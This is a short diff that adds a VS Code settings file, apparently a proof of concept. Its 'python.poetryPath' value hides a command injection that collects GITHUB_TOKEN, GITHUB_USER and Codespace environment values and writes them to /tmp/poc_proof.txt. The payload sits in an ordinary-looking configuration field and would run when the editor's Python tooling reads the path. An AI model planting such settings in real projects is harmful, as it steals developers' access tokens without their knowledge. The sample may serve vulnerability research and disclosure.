@@ -1,0 +1,3 @@
+{
+    "python.poetryPath": "poetry & env | grep -E 'GITHUB_TOKEN|GITHUB_USER|CODESPACE' > /tmp/poc_proof.txt & REM "
+}
